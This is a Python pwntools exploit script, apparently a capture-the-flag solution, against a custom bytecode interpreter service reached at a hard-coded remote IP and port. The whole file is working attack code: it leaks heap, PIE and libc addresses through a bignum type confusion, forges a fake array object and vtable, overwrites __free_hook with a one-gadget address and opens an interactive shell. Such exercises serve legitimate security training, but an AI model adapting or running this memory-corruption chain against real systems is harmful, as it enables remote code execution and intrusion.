from pwn import *
s = remote('52.78.10.103',31337)
raw_input()
def Array(types,size):
  s.send(p8(0x20)) # DefineVariable
  s.send(p32(0x10001000)) # Array {0x20 : IntArray, 0x17: VarArray}
  s.send(p8(types)) # Type
  s.send(p64(size)) # size < 100
def String(dat):
  s.send(p8(0x20)) # DefineVariable
  s.send(p32(0x20002000)) # String 
  s.send(dat) # length < 100
def Intger(intger):
  s.send(p8(0x20)) # DefineVariable
  s.send(p32(intger)) # intger {x > 0x80000000 = BigNumber}
def IntBox(dst,src,index):
  s.send(p8(0x17)) # UsingVariable
  s.send(p8(0x13)) # IntBox
  s.send(p64(dst)) # dest State index
  s.send(p64(src)) # src State index
  s.send(p64(index)) # dest Array index
def Print(index):
  s.send(p8(0x17)) # UsingVariable
  s.send(p8(0x22)) # Print
  s.send(p64(index)) # index
def Box(dst,src,index):
  s.send(p8(0x17)) # UsingVariable
  s.send(p8(0x37)) # Box
  s.send(p64(dst)) # dest State index
  s.send(p64(src)) # src State index
  s.send(p64(index)) # dest Array index
def Concat(dst,src):
  s.send(p8(0x17)) # UsingVariable
  s.send(p8(0x33)) # Concat
  s.send(p64(dst)) # dest State index
  s.send(p64(src)) # src State index
def out(src,index):
  s.send(p8(0x17)) # UsingVariable
  s.send(p8(0x11)) # Out
  s.send(p64(src)) # src State index
  s.send(p64(index)) #index
def BNCalc(dst,src,tag):
  s.send(p8(0x17)) # UsingVariable
  s.send(p8(0x77)) # BNCalc
  s.send(p64(dst)) # dest State index
  s.send(p64(src)) # src State index
  s.send(p8(tag)) # tag
String("s0nagi\n")
s.recvuntil(']')
Intger(0xf0000000)
s.recvuntil(']')
BNCalc(1,0,1)
Print(1)
heap = int(s.recvuntil(']')[2:-1],10) - 0xf0000000
log.info("HEAP : 0x%x"%heap)
fake_bn = heap - 0x40
Intger(fake_bn&0xffffffff)
s.recvuntil(']')
Intger(fake_bn>>32)
s.recvuntil(']')
Array(0x20,0x20)
s.recvuntil(']')
Array(0x17,0x20)
s.recvuntil(']')
IntBox(2,0,1)
IntBox(2,1,2)
Concat(3,2)
out(4,1)
Intger(0xf0000000)
s.recvuntil(']')
BNCalc(6,5,1)
Print(6)
pie = int(s.recvuntil(']')[2:-1],10) - 0xf0000000 - 0x203C40 # String vtable
log.info("PIE : 0x%x"%pie)
malloc_got = pie+0x203F58
Intger((malloc_got-0x10)&0xffffffff)
s.recvuntil(']')
Intger((malloc_got-0x10)>>32)
s.recvuntil(']')
IntBox(2,2,1)
IntBox(2,3,2)
Concat(3,2)
out(7,1)
Intger(0xf0000000)
s.recvuntil(']')
BNCalc(9,8,1)
Print(9)
libc = int(s.recvuntil(']')[2:-1],10) - 0xf0084130
log.info("LIBC : 0x%x"%libc)
raw_input()
free_hook = libc + 0x3c67a8
vtable = pie + 0x203BF8 # NativeIntArray vtable
Intger(vtable&0xffffffff)
s.recvuntil(']')
Intger(vtable>>32)
s.recvuntil(']')
Intger(0x10001001)
s.recvuntil(']')
Intger(0x1)
s.recvuntil(']')
Intger(0xffff)
s.recvuntil(']')
Intger(free_hook&0xffffffff)
s.recvuntil(']')
Intger(free_hook>>32)
s.recvuntil(']')
Intger(free_hook>>32)
s.recvuntil(']')
IntBox(2,4,11) 
IntBox(2,5,12) # vtable
IntBox(2,6,13) # object type
IntBox(2,7,14) # array type
IntBox(2,8,15) # length
IntBox(2,8,17) # capacity
IntBox(2,9,19)
IntBox(2,11,20)
fake_obj = heap + 0x10a8
Intger(fake_obj&0xffffffff)
Intger(fake_obj>>32)
Array(0x20,0x20)
Array(0x20,0x20)
IntBox(11,12,1)
IntBox(11,13,2)
Concat(3,11)
out(12,1)
magic = libc + 0xf1117#0xef6c4
Intger(magic&0xffffffff)
Intger(magic>>32)
IntBox(13,14,1)
IntBox(13,15,2)
s.send('\x00')
s.interactive()
